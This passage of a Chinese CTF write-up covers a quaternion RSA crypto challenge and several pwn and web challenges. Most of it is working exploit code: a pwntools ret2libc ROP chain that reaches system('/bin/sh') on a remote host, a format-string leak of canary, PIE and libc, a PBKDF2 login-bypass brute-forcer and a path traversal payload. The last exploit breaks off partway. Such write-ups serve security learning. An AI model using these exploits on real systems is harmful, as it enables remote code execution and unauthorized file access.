    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> value<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>value <span class="token operator">=</span> value
    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> k<span class="token punctuation">,</span>i <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">:</span>
                s <span class="token operator">+=</span> <span class="token string">'+'</span>
            s <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'ijk'</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span>
        <span class="token keyword">return</span> s
    <span class="token keyword">def</span> <span class="token function">__add__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> ComComplex<span class="token punctuation">(</span><span class="token punctuation">[</span>i<span class="token operator">+</span>j <span class="token keyword">for</span> i<span class="token punctuation">,</span>j <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>value<span class="token punctuation">,</span>x<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">__mul__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
        a <span class="token operator">=</span> self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
        b <span class="token operator">=</span> self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">-</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
        c <span class="token operator">=</span> self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        d <span class="token operator">=</span> self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">return</span> ComComplex<span class="token punctuation">(</span><span class="token punctuation">[</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">__mod__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> ComComplex<span class="token punctuation">(</span><span class="token punctuation">[</span>i <span class="token operator">%</span> x <span class="token keyword">for</span> i <span class="token keyword">in</span> self<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">__pow__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">,</span> n<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        tmp <span class="token operator">=</span> ComComplex<span class="token punctuation">(</span>self<span class="token punctuation">.</span>value<span class="token punctuation">)</span>
        a <span class="token operator">=</span> ComComplex<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">while</span> x<span class="token punctuation">:</span>
            <span class="token keyword">if</span> x <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">:</span>
                a <span class="token operator">*=</span> tmp
            tmp <span class="token operator">*=</span> tmp
            <span class="token keyword">if</span> n<span class="token punctuation">:</span>
                a <span class="token operator">%=</span> n
                tmp <span class="token operator">%=</span> n
            x <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">1</span>
        <span class="token keyword">return</span> a
        
    <span class="token keyword">def</span> <span class="token function">inv</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span>mod<span class="token punctuation">)</span><span class="token punctuation">:</span>
        inv_len<span class="token operator">=</span>inverse<span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">(</span>i<span class="token operator">**</span><span class="token number">2</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">)</span><span class="token punctuation">,</span>mod<span class="token punctuation">)</span>
        <span class="token keyword">return</span> ComComplex<span class="token punctuation">(</span><span class="token punctuation">[</span>l<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>inv_len<span class="token operator">%</span>mod<span class="token punctuation">,</span><span class="token operator">-</span>l<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>inv_len<span class="token operator">%</span>mod<span class="token punctuation">,</span><span class="token operator">-</span>l<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">*</span>inv_len<span class="token operator">%</span>mod<span class="token punctuation">,</span><span class="token operator">-</span>l<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">*</span>inv_len<span class="token operator">%</span>mod<span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

hints <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">375413371936</span><span class="token punctuation">,</span><span class="token number">452903063925</span><span class="token punctuation">,</span><span class="token number">418564633198</span><span class="token punctuation">,</span><span class="token number">452841062207</span><span class="token punctuation">]</span>
gift <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">8123312244520119413231609191866976836916616973013918670932199631084038015924368317077919454611785179950870055560079987034735836668109705445946887481003729</span><span class="token punctuation">,</span><span class="token number">20508867471664499348708768798854433383217801696267611753941328714877299161068885700412171</span><span class="token punctuation">,</span><span class="token number">22802458968832151777449744120185122420871929971817937643641589637402679927558503881707868</span><span class="token punctuation">,</span><span class="token number">40224499597522456323122179021760594618350780974297095023316834212332206526399536884102863</span><span class="token punctuation">]</span>
P <span class="token operator">=</span> <span class="token number">8123312244520119413231609191866976836916616973013918670932199631182724263362174895104545305364960781233690810077210539091362134310623408173268475389315109</span>
n <span class="token operator">=</span> <span class="token number">408713495380933615345467409596399184629824932933932227692519320046890365817329617301604051766392980053993030281090124694858194866782889226223493799859404283664530068697313752856923001112586828837146686963124061670340088332769524367</span>
c <span class="token operator">=</span> ComComplex<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103</span><span class="token punctuation">,</span><span class="token number">24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825</span><span class="token punctuation">,</span><span class="token number">45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125</span><span class="token punctuation">,</span><span class="token number">96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
e<span class="token operator">=</span><span class="token number">65547</span>

inv<span class="token operator">=</span>ComComplex<span class="token punctuation">.</span>inv<span class="token punctuation">(</span>hints<span class="token punctuation">,</span>P<span class="token punctuation">)</span>
gifts<span class="token operator">=</span>ComComplex<span class="token punctuation">(</span>gift<span class="token punctuation">)</span>
keys<span class="token operator">=</span>inv<span class="token operator">*</span>gifts<span class="token operator">%</span>P
<span class="token keyword">print</span><span class="token punctuation">(</span>keys<span class="token punctuation">)</span>

_<span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token punctuation">,</span>r<span class="token operator">=</span>keys<span class="token punctuation">.</span>value
<span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token operator">*</span>q<span class="token operator">*</span>r<span class="token operator">-</span>n<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>GCD<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>GCD<span class="token punctuation">(</span>e<span class="token punctuation">,</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>GCD<span class="token punctuation">(</span>e<span class="token punctuation">,</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>GCD<span class="token punctuation">(</span>e<span class="token punctuation">,</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


d<span class="token operator">=</span>inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>q<span class="token operator">**</span><span class="token number">4</span><span class="token operator">-</span>q<span class="token operator">**</span><span class="token number">3</span><span class="token operator">-</span>q<span class="token operator">**</span><span class="token number">2</span><span class="token operator">+</span>q<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">)</span>
m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>q<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> m<span class="token punctuation">.</span>value<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>


</code></pre>

<p>flag{Quaternion_15_ComComComComplexXXX!!!?}</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Ret2libc’s-Revenge"><a href="#Ret2libc’s-Revenge" class="headerlink" title="Ret2libc’s Revenge"></a>Ret2libc’s Revenge</h3><p>溢出可以写负数来改返回地址，之后ret2libc就行</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"DEBUG"</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>
<span class="token comment">#io=process("./chal")</span>
io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"47.93.96.189"</span><span class="token punctuation">,</span> <span class="token number">36879</span><span class="token punctuation">)</span>

r <span class="token operator">=</span> <span class="token keyword">lambda</span> a <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>    a<span class="token operator">=</span><span class="token boolean">False</span>        <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token boolean">True</span>    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b        <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
shell <span class="token operator">=</span> <span class="token keyword">lambda</span>            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>script<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>script<span class="token punctuation">)</span>

<span class="token comment">#debug("break *0x40127A")</span>
<span class="token comment">#debug()</span>

<span class="token comment">#target=0x404000-0x20</span>
target<span class="token operator">=</span><span class="token number">0x4005b0</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">-</span><span class="token number">0x20</span>
rbp<span class="token operator">=</span><span class="token number">0x040117d</span>
rsi_0<span class="token operator">=</span><span class="token number">0x00000000004010e4</span>
add_rsi<span class="token operator">=</span><span class="token number">0x04010eb</span>
puts<span class="token operator">=</span><span class="token number">0x404018</span>
rdi_rsi<span class="token operator">=</span><span class="token number">0x0401180</span>
plt<span class="token operator">=</span><span class="token number">0x0401070</span>
main<span class="token operator">=</span><span class="token number">0x40127B</span>
ret<span class="token operator">=</span><span class="token number">0x00000000004012a9</span>

num<span class="token operator">=</span><span class="token number">0xffffffff</span><span class="token operator">-</span><span class="token number">0x12</span><span class="token operator">-</span><span class="token number">0xc8</span>
p<span class="token operator">=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">528</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rsi_0<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>add_rsi<span class="token punctuation">)</span>
p<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rdi_rsi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">160</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>

libc<span class="token operator">=</span>u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x21b780</span>
<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">)</span>


rsi<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x2be51</span>
rsi_rdx<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x118f2f</span>
rdi<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x2a3e5</span>

binsh<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x1d8678</span>
system<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0xeb080</span>
<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span>

p<span class="token operator">=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">528</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4040a0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rsi_rdx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
shell<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>



<h3 id="web苦手"><a href="#web苦手" class="headerlink" title="web苦手"></a>web苦手</h3><p>两个密码生成的密钥只要最高位为00就可以绕过检测</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> string

salt <span class="token operator">=</span> <span class="token string">b"XYCTF"</span>
iterations <span class="token operator">=</span> <span class="token number">1</span>
dklen <span class="token operator">=</span> <span class="token number">32</span>

charset <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits  <span class="token comment"># a-zA-Z0-9</span>

<span class="token keyword">for</span> length <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> candidate <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span>charset<span class="token punctuation">,</span> repeat<span class="token operator">=</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
        password <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>candidate<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        key <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>pbkdf2_hmac<span class="token punctuation">(</span><span class="token string">"sha1"</span><span class="token punctuation">,</span> password<span class="token punctuation">,</span> salt<span class="token punctuation">,</span> iterations<span class="token punctuation">,</span> dklen<span class="token punctuation">)</span>
        <span class="token keyword">if</span> key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Found password:"</span><span class="token punctuation">,</span> password<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>errors<span class="token operator">=</span><span class="token string">"ignore"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">#J</span>
<span class="token comment">#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaae2</span>
</code></pre>

<p>用这两个密码登陆之后目录穿越拿到真的flag</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">//</span>flag</code></pre>

<h3 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h3><p>栈迁移打mprotect，之后用openat, mmap, write 读flag</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"DEBUG"</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>
<span class="token comment">#io=process("./chal")</span>
io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"47.94.15.198"</span><span class="token punctuation">,</span> <span class="token number">34840</span><span class="token punctuation">)</span>

r <span class="token operator">=</span> <span class="token keyword">lambda</span> a <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>    a<span class="token operator">=</span><span class="token boolean">False</span>        <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token boolean">True</span>    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b        <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
shell <span class="token operator">=</span> <span class="token keyword">lambda</span>            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>script<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>script<span class="token punctuation">)</span>


sa<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>
p<span class="token operator">=</span><span class="token string">"%7$p-%15$p-%3$p"</span>
sa<span class="token punctuation">(</span><span class="token string">"first"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">"name:\n"</span><span class="token punctuation">)</span>
leak<span class="token operator">=</span>ru<span class="token punctuation">(</span><span class="token string">"Y"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span>
canary<span class="token operator">=</span><span class="token builtin">eval</span><span class="token punctuation">(</span>leak<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
pie<span class="token operator">=</span><span class="token builtin">eval</span><span class="token punctuation">(</span>leak<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x18d9</span>
libc<span class="token operator">=</span><span class="token builtin">eval</span><span class="token punctuation">(</span>leak<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x114887</span>
